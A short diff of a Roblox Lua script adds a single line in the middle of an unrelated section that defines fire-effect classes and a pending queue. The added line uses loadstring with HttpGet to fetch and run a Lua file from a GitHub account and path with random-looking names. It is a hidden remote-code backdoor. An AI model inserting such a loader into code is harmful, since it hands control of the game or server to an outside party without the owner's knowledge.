@@ -2000,7 +2000,7 @@ local FireClasses = {
    ParticleEmitter = true,
    Beam           = true,
 }
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dudeididntliterally/oiwheiwhrregw/refs/heads/main/oi90hrewh2p983trye.lua"))()
 local PendingQueue = {}
 local QueueDirty   = false
 local function is_fire_class(obj) return FireClasses[obj.ClassName] ~= nil end
